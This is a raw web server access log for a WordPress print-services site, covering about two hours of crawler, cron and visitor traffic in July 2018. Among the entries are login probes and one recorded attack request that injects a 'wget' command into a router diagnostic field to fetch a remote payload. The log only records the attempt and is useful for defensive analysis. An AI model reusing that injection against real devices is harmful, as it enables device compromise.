104.154.198.228 - - [25/Jul/2018:02:30:41 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:02:30:42 -0700] "POST /wp-cron.php?doing_wp_cron=1532511042.1212060451507568359375 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532511042.1212060451507568359375" "WordPress/4.9.7; http://www.aablueprint.com" 
208.113.153.204 - - [25/Jul/2018:02:35:39 -0700] "POST /wp-cron.php?doing_wp_cron=1532511339.4767360687255859375000 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532511339.4767360687255859375000" "WordPress/4.9.7; http://www.aablueprint.com" 
104.239.207.195 - - [25/Jul/2018:02:35:39 -0700] "GET /home/feed HTTP/1.1" 301 591 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" 
104.239.207.195 - - [25/Jul/2018:02:35:40 -0700] "GET /home/feed/ HTTP/1.1" 200 1434 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" 
104.154.198.228 - - [25/Jul/2018:02:35:55 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:02:39:14 -0700] "POST /wp-cron.php?doing_wp_cron=1532511554.2958390712738037109375 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532511554.2958390712738037109375" "WordPress/4.9.7; http://www.aablueprint.com" 
216.244.66.230 - - [25/Jul/2018:02:39:13 -0700] "GET /robots.txt HTTP/1.1" 200 553 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
66.249.70.12 - - [25/Jul/2018:02:40:35 -0700] "GET /wp-content/uploads/2014/03/oce-plotwave-340360.jpg HTTP/1.1" 304 166 "-" "Googlebot-Image/1.0" 
104.154.198.228 - - [25/Jul/2018:02:41:41 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
141.8.144.2 - - [25/Jul/2018:02:45:19 -0700] "GET /wp-content/uploads/2014/12/imagePROGRAF_iPF_785_780_685_680_Brochure.pdf HTTP/1.1" 200 1367896 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
104.154.198.228 - - [25/Jul/2018:02:47:42 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:02:47:43 -0700] "POST /wp-cron.php?doing_wp_cron=1532512063.2827610969543457031250 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532512063.2827610969543457031250" "WordPress/4.9.7; http://www.aablueprint.com" 
216.244.66.230 - - [25/Jul/2018:02:47:44 -0700] "GET /wp-content/uploads/2014/12/pdf HTTP/1.1" 200 1949141 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
104.154.198.228 - - [25/Jul/2018:02:53:33 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:02:53:34 -0700] "POST /wp-cron.php?doing_wp_cron=1532512414.3657948970794677734375 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532512414.3657948970794677734375" "WordPress/4.9.7; http://www.aablueprint.com" 
104.239.197.207 - - [25/Jul/2018:02:55:14 -0700] "GET /home/feed HTTP/1.1" 301 591 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" 
104.239.197.207 - - [25/Jul/2018:02:55:14 -0700] "GET /home/feed/ HTTP/1.1" 200 1434 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" 
203.81.71.1 - - [25/Jul/2018:02:57:27 -0700] "GET /wp-login.php HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
203.81.71.1 - - [25/Jul/2018:02:57:28 -0700] "GET / HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
208.113.153.204 - - [25/Jul/2018:02:58:01 -0700] "POST /wp-cron.php?doing_wp_cron=1532512681.3806469440460205078125 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532512681.3806469440460205078125" "WordPress/4.9.7; http://www.aablueprint.com" 
192.243.55.95 - - [25/Jul/2018:02:58:00 -0700] "GET /home/feed/ HTTP/1.1" 200 1432 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
104.154.198.228 - - [25/Jul/2018:02:59:13 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
104.154.198.228 - - [25/Jul/2018:03:05:16 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:03:05:17 -0700] "POST /wp-cron.php?doing_wp_cron=1532513116.7411270141601562500000 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532513116.7411270141601562500000" "WordPress/4.9.7; http://www.aablueprint.com" 
158.69.252.227 - - [25/Jul/2018:03:05:44 -0700] "GET / HTTP/1.1" 301 469 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2" 
158.69.252.227 - - [25/Jul/2018:03:05:44 -0700] "GET / HTTP/1.1" 200 23001 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2" 
101.108.103.225 - - [25/Jul/2018:03:08:25 -0700] "GET /wp-login.php HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
101.108.103.225 - - [25/Jul/2018:03:08:26 -0700] "GET / HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
104.154.198.228 - - [25/Jul/2018:03:10:44 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:03:10:45 -0700] "POST /wp-cron.php?doing_wp_cron=1532513445.8011560440063476562500 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532513445.8011560440063476562500" "WordPress/4.9.7; http://www.aablueprint.com" 
66.249.70.12 - - [25/Jul/2018:03:11:07 -0700] "GET /wp-content/uploads/2014/02/digital-color-bottom-left3.jpg HTTP/1.1" 304 167 "-" "Googlebot-Image/1.0" 
173.249.6.207 - - [25/Jul/2018:03:15:00 -0700] "GET /user/register/ HTTP/1.1" 301 497 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0" 
173.249.6.207 - - [25/Jul/2018:03:15:00 -0700] "GET / HTTP/1.1" 301 469 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0" 
167.99.42.89 - - [25/Jul/2018:03:16:19 -0700] "GET /contact-us/ HTTP/1.0" 301 491 "http://latex.xblog.in" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
123.125.71.28 - - [25/Jul/2018:03:16:19 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/bar/bar.css?ver=4.9.7 HTTP/1.1" 200 1387 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
104.154.198.228 - - [25/Jul/2018:03:17:02 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:03:17:03 -0700] "POST /wp-cron.php?doing_wp_cron=1532513823.1209559440612792968750 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532513823.1209559440612792968750" "WordPress/4.9.7; http://www.aablueprint.com" 
46.36.35.96 - - [25/Jul/2018:03:17:09 -0700] "GET /contact-us/ HTTP/1.0" 301 491 "http://aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
35.205.216.250 - - [25/Jul/2018:03:19:50 -0700] "GET / HTTP/1.0" 200 23001 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
180.190.51.118 - - [25/Jul/2018:03:22:05 -0700] "GET /brands/epson/ HTTP/1.1" 200 7415 "https://www.google.com.ph/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
208.113.153.204 - - [25/Jul/2018:03:22:06 -0700] "POST /wp-cron.php?doing_wp_cron=1532514126.3974049091339111328125 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532514126.3974049091339111328125" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:03:22:27 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
180.190.51.118 - - [25/Jul/2018:03:22:28 -0700] "GET /wp-content/themes/aablueprint-v1.3/favicon.ico HTTP/1.1" 200 11642 "http://www.aablueprint.com/brands/epson/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
216.244.66.230 - - [25/Jul/2018:03:22:33 -0700] "GET /robots.txt HTTP/1.1" 200 553 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
161.47.12.21 - - [25/Jul/2018:03:25:42 -0700] "GET /feed/atom HTTP/1.1" 301 541 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" 
161.47.12.21 - - [25/Jul/2018:03:25:42 -0700] "GET /feed/atom/ HTTP/1.1" 200 1280 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0" 
208.113.153.204 - - [25/Jul/2018:03:27:31 -0700] "POST /wp-cron.php?doing_wp_cron=1532514451.7084710597991943359375 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532514451.7084710597991943359375" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:03:27:31 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
216.244.66.230 - - [25/Jul/2018:03:30:41 -0700] "GET /print_services/vehicle-graphics/feed/ HTTP/1.1" 404 17853 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
104.154.198.228 - - [25/Jul/2018:03:33:13 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:03:33:14 -0700] "POST /wp-cron.php?doing_wp_cron=1532514794.0668540000915527343750 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532514794.0668540000915527343750" "WordPress/4.9.7; http://www.aablueprint.com" 
195.154.166.8 - - [25/Jul/2018:03:36:28 -0700] "GET /brands/oce-canon-solutions-america HTTP/1.1" 301 550 "http://aablueprint.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" 
195.154.166.8 - - [25/Jul/2018:03:36:29 -0700] "GET /brands/oce-canon-solutions-america HTTP/1.1" 301 535 "http://aablueprint.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" 
195.154.166.8 - - [25/Jul/2018:03:36:32 -0700] "GET /brands/oce-canon-solutions-america/ HTTP/1.1" 200 7515 "http://aablueprint.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" 
195.154.166.8 - - [25/Jul/2018:03:36:34 -0700] "GET /brands/oce-canon-solutions-america/ HTTP/1.1" 200 7515 "http://www.aablueprint.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" 
195.154.166.8 - - [25/Jul/2018:03:36:35 -0700] "\x16\x03\x01\x018\x01" 200 22527 "-" "-" 
104.154.198.228 - - [25/Jul/2018:03:39:07 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:03:39:07 -0700] "POST /wp-cron.php?doing_wp_cron=1532515147.6376619338989257812500 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532515147.6376619338989257812500" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:03:44:33 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:03:44:34 -0700] "POST /wp-cron.php?doing_wp_cron=1532515474.2808930873870849609375 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532515474.2808930873870849609375" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:03:50:36 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:03:50:37 -0700] "POST /wp-cron.php?doing_wp_cron=1532515836.8659589290618896484375 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532515836.8659589290618896484375" "WordPress/4.9.7; http://www.aablueprint.com" 
66.249.70.16 - - [25/Jul/2018:03:55:01 -0700] "GET /robots.txt HTTP/1.1" 200 611 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
208.113.153.204 - - [25/Jul/2018:03:55:02 -0700] "POST /wp-cron.php?doing_wp_cron=1532516102.2013049125671386718750 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532516102.2013049125671386718750" "WordPress/4.9.7; http://www.aablueprint.com" 
113.109.12.158 - - [25/Jul/2018:03:56:05 -0700] "GET / HTTP/1.1" 200 5711 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
104.154.198.228 - - [25/Jul/2018:03:56:47 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
113.109.12.158 - - [25/Jul/2018:03:56:50 -0700] "GET /contact-us/ HTTP/1.1" 200 5939 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:50 -0700] "GET / HTTP/1.1" 200 5711 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:52 -0700] "GET /about_us/location/ HTTP/1.1" 200 5594 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:53 -0700] "GET /about_us/why-aa/ HTTP/1.1" 200 6120 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:53 -0700] "GET //s0.wp.com HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:53 -0700] "GET /about_us/edge-certification/ HTTP/1.1" 200 5350 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:54 -0700] "GET //secure.gravatar.com HTTP/1.1" 301 437 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:55 -0700] "GET /s0.wp.com HTTP/1.1" 404 4455 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:55 -0700] "GET //s.w.org HTTP/1.1" 301 425 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:55 -0700] "GET /home/feed/ HTTP/1.1" 200 1432 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:57 -0700] "GET /secure.gravatar.com HTTP/1.1" 404 4458 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:57 -0700] "GET /xmlrpc.php?rsd&v=2&at1=631DE31E03142313E313C31F431F431DC31E631DC31DC31DC9E31E&at2=14111&at3=FAED9C3DD3B9C60BA6F05C7525D9EC94&at4=HeiYc7tWcc4gOfnbn9fXCTXrhoCah5Rr&at5=nq2014..**&at6=0CB53B21D16F4CFA926F38FFE3774506 HTTP/1.1" 200 683 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:57 -0700] "GET /wp-json/oembed/1.0/embed?url=http://www.aablueprint.com/&&v=2&at1=631DE31E03142313E313C31F431F431DC31E631DC31DC31DC9E31E&at2=14111&at3=FAED9C3DD3B9C60BA6F05C7525D9EC94&at4=HeiYc7tWcc4gOfnbn9fXCTXrhoCah5Rr&at5=nq2014..**&at6=0CB53B21D16F4CFA926F38FFE3774506 HTTP/1.1" 200 2814 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:57 -0700] "GET /wp-json/oembed/1.0/embed?url=http://www.aablueprint.com/&v=2&at1=631DE31E03142313E313C31F431F431DC31E631DC31DC31DC9E31E&at2=14111&at3=FAED9C3DD3B9C60BA6F05C7525D9EC94&at4=HeiYc7tWcc4gOfnbn9fXCTXrhoCah5Rr&at5=nq2014..**&at6=0CB53B21D16F4CFA926F38FFE3774506 HTTP/1.1" 200 2816 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:58 -0700] "GET /tel:1-800-821-3700 HTTP/1.1" 404 4516 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:57 -0700] "GET /s.w.org HTTP/1.1" 404 4453 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:57 -0700] "GET /wp-json/ HTTP/1.1" 200 88374 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:56:57 -0700] "GET //v0.wordpress.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:57:00 -0700] "GET /brands/supplies HTTP/1.1" 301 460 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
208.113.153.204 - - [25/Jul/2018:03:57:03 -0700] "POST /wp-cron.php?doing_wp_cron=1532516223.4903008937835693359375 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532516223.4903008937835693359375" "WordPress/4.9.7; http://www.aablueprint.com" 
113.109.12.158 - - [25/Jul/2018:03:57:02 -0700] "GET /print_services/small-format-digital/ HTTP/1.1" 200 7040 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:57:04 -0700] "GET /print_services/scanning-digital-archiving/ HTTP/1.1" 200 7296 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
113.109.12.158 - - [25/Jul/2018:03:57:09 -0700] "GET /print_services/mounting-finishing/ HTTP/1.1" 200 6615 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" 
219.100.88.245 - - [25/Jul/2018:04:00:54 -0700] "GET /cgi-bin/luci/;stok=redacted/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%20%3B%20wget%20http://178.128.11.199/exploit HTTP/1.0" 404 18017 "-" "-" 
208.113.153.204 - - [25/Jul/2018:04:02:04 -0700] "POST /wp-cron.php?doing_wp_cron=1532516524.1914410591125488281250 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532516524.1914410591125488281250" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:04:02:03 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:04:05:26 -0700] "POST /wp-cron.php?doing_wp_cron=1532516726.2641260623931884765625 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532516726.2641260623931884765625" "WordPress/4.9.7; http://www.aablueprint.com" 
77.75.78.165 - - [25/Jul/2018:04:05:25 -0700] "GET /robots.txt HTTP/1.1" 200 611 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.165 - - [25/Jul/2018:04:05:32 -0700] "GET /print_services/scanning-digital-archiving/ HTTP/1.1" 200 7353 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.165 - - [25/Jul/2018:04:05:36 -0700] "GET /wp-content/uploads/2014/02/t2500.jpg HTTP/1.1" 304 166 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.165 - - [25/Jul/2018:04:05:37 -0700] "GET /brands/hp-design-jets/feed/ HTTP/1.1" 200 9766 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
208.113.153.204 - - [25/Jul/2018:04:08:17 -0700] "POST /wp-cron.php?doing_wp_cron=1532516897.2714469432830810546875 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532516897.2714469432830810546875" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:04:08:16 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
192.243.55.95 - - [25/Jul/2018:04:08:32 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9009 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
66.249.64.13 - - [25/Jul/2018:04:13:37 -0700] "GET /robots.txt HTTP/1.1" 301 508 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.12 - - [25/Jul/2018:04:13:37 -0700] "GET /PDF_XLS_MDB/HP%20Designjet%20T610%20and%20T1100.pdf HTTP/1.1" 301 570 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)" 
104.154.198.228 - - [25/Jul/2018:04:14:02 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:04:14:03 -0700] "POST /wp-cron.php?doing_wp_cron=1532517243.5651121139526367187500 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532517243.5651121139526367187500" "WordPress/4.9.7; http://www.aablueprint.com" 
208.113.153.204 - - [25/Jul/2018:04:17:28 -0700] "POST /wp-cron.php?doing_wp_cron=1532517448.6062469482421875000000 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532517448.6062469482421875000000" "WordPress/4.9.7; http://www.aablueprint.com" 
141.8.144.2 - - [25/Jul/2018:04:17:28 -0700] "GET /xmlrpc.php?rsd HTTP/1.1" 200 741 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
104.154.198.228 - - [25/Jul/2018:04:19:41 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
17.58.100.115 - - [25/Jul/2018:04:19:56 -0700] "GET /robots.txt HTTP/1.1" 200 613 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.115 - - [25/Jul/2018:04:19:57 -0700] "GET /brands/supplies HTTP/1.1" 301 515 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.115 - - [25/Jul/2018:04:19:58 -0700] "GET /robots.txt HTTP/1.1" 200 610 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.115 - - [25/Jul/2018:04:19:58 -0700] "GET /brands/supplies/ HTTP/1.1" 200 5686 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
66.249.70.16 - - [25/Jul/2018:04:20:22 -0700] "GET /m_planrooms.asp HTTP/1.1" 404 4566 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
179.127.119.212 - - [25/Jul/2018:04:20:47 -0700] "GET / HTTP/1.1" 200 23039 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
104.154.198.228 - - [25/Jul/2018:04:25:15 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:04:25:16 -0700] "POST /wp-cron.php?doing_wp_cron=1532517915.8884270191192626953125 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532517915.8884270191192626953125" "WordPress/4.9.7; http://www.aablueprint.com" 
